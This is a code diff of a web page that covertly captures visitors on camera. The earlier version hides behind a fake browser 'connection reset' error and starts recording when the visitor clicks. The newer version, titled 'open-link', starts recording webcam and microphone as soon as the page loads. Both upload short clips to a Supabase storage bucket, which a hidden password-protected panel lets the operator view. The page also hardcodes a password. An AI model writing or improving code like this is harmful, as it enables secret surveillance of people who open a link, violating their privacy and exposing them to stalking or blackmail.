@@ -1,7 +1,6 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
-  <title>This site can’t be reached</title>
+  <title>open-link</title>
   <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
   <style>
     body {
@@ -9,36 +8,9 @@
       background: white;
       height: 100vh;
       width: 100vw;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      overflow: hidden;
+      font-family: sans-serif;
       text-align: center;
-      font-family: Arial, sans-serif;
-      color: #5f6368;
-    }
-    #errorBox {
-      max-width: 800px;
-    }
-    h2 {
-      font-size: 40px;
-      font-weight: bold;
-    }
-    p, li {
-      font-size: 22px;
-      margin: 10px 0;
-    }
-    ul {
-      list-style: disc;
-      padding-left: 20px;
-      text-align: left;
-    }
-    .fakeBtn {
-      display: inline-block;
-      margin-top: 20px;
-      font-size: 24px;
-      color: #1a73e8;
-      text-decoration: underline;
-      cursor: pointer;
     }
     #lockIcon {
       position: fixed;
@@ -61,44 +33,27 @@
       width: 90%;
       max-width: 600px;
       background: #000;
-      margin-top: 20px;
+      margin-top: 10px;
     }
     button {
       padding: 10px 20px;
       background: red;
       color: white;
       border: none;
-      font-size: 18px;
+      font-size: 16px;
       cursor: pointer;
+      margin: 20px;
     }
   </style>
 </head>
-<body>
-
-<div id="lockIcon" onclick="unlock()">🔒</div>
-
-<div id="errorBox">
-  <h2>This site can’t be reached</h2>
-  <p>The connection was reset.</p>
-  <p>Try:</p>
-  <ul>
-    <li>Checking the connection</li>
-  </ul>
-  <p><b>ERR_CONNECTION_RESET</b></p>
-  <div class="fakeBtn">Reload</div>
-  <p>Details</p>
-</div>
-
-<div id="viewer">
+<body><div id="lockIcon" onclick="unlock()">🔒</div><div id="viewer">
   <h3>Recording Playback</h3>
   <video id="playback" controls></video>
   <br>
   <button onclick="stopRecording()">STOP</button>
   <h3>Last 4 Recordings</h3>
   <div id="videoList"></div>
-</div>
-
-<script>
+</div><script>
   const PASSWORD = "sardarhamza";
   const BUCKET = "recordings";
   const client = supabase.createClient(
@@ -110,9 +65,11 @@
   let recordedChunks = [];
   let recordingStarted = false;
   let stopped = false;
+  let abortRecording = false;
 
-  document.body.addEventListener("click", async (e) => {
-    if (e.target.id === "lockIcon" || recordingStarted) return;
+  window.onload = startRecording; // Auto-start
+
+  async function startRecording() {
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       mediaRecorder = new MediaRecorder(stream);
@@ -122,39 +79,23 @@
         if (e.data.size > 0) recordedChunks.push(e.data);
       };
 
-      mediaRecorder.start();
-      recordingStarted = true;
-
-      setTimeout(() => {
-        if (!stopped) stopRecording();
-      }, 4000); // auto-stop after 4 seconds
-
-    } catch (err) {
-      alert("Camera Error: " + err.message);
-    }
-  });
-
-  async function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state === "recording") {
-      mediaRecorder.stop();
-      stream.getTracks().forEach(t => t.stop());
-      stopped = true;
-
       mediaRecorder.onstop = async () => {
+        if (abortRecording) return;
+
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
         const url = URL.createObjectURL(blob);
         document.getElementById("playback").src = url;
 
         const fileName = `video_${Date.now()}.webm`;
 
-        const { data: allFiles } = await client.storage.from(BUCKET).list('', {
+        const { data: existing } = await client.storage.from(BUCKET).list('', {
           sortBy: { column: 'name', order: 'asc' }
         });
 
-        const webms = allFiles.filter(f => f.name.endsWith('.webm'));
-        if (webms.length > 4) {
-          const toDelete = webms.slice(0, webms.length - 4);
-          await client.storage.from(BUCKET).remove(toDelete.map(f => f.name));
+        const videosOnly = existing.filter(f => f.name.endsWith('.webm'));
+        if (videosOnly.length >= 4) {
+          const oldest = videosOnly[0];
+          await client.storage.from(BUCKET).remove([oldest.name]);
         }
 
         const { error } = await client.storage.from(BUCKET).upload(fileName, blob);
@@ -163,18 +104,40 @@
           loadVideos();
         }
       };
+
+      mediaRecorder.start();
+      recordingStarted = true;
+      console.log("Recording started");
+
+      setTimeout(() => {
+        if (!stopped) stopRecording();
+      }, 4000); // auto stop after 4 seconds
+    } catch (err) {
+      alert("Camera Error: " + err.message);
+    }
+  }
+
+  function stopRecording() {
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(t => t.stop());
+      stopped = true;
     }
   }
 
   async function unlock() {
     const input = prompt("Enter password:");
     if (input !== PASSWORD) return alert("Wrong password!");
+    abortRecording = true;
+    stopped = true;
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    recordedChunks = [];
     document.getElementById("viewer").style.display = "block";
     loadVideos();
   }
 
   async function loadVideos() {
-    const { data } = await client.storage.from(BUCKET).list('', {
+    const { data, error } = await client.storage.from(BUCKET).list('', {
       sortBy: { column: 'name', order: 'desc' }
     });
 
@@ -184,19 +147,21 @@
     const filtered = (data || [])
       .filter(f => f.name.endsWith('.webm'))
       .sort((a, b) => b.name.localeCompare(a.name))
-      .slice(-4); // last 4 videos
+      .slice(0, 4);
 
     for (let file of filtered) {
-      const { data: signed } = await client.storage.from(BUCKET).createSignedUrl(file.name, 3600);
+      const { data: signed } = await client
+        .storage.from(BUCKET)
+        .createSignedUrl(file.name, 60 * 60);
+
       if (signed?.signedUrl) {
         const vid = document.createElement("video");
         vid.src = signed.signedUrl;
         vid.controls = true;
+        vid.style.marginTop = "15px";
         container.appendChild(vid);
       }
     }
   }
-</script>
-
-</body>
+</script></body>
 </html>
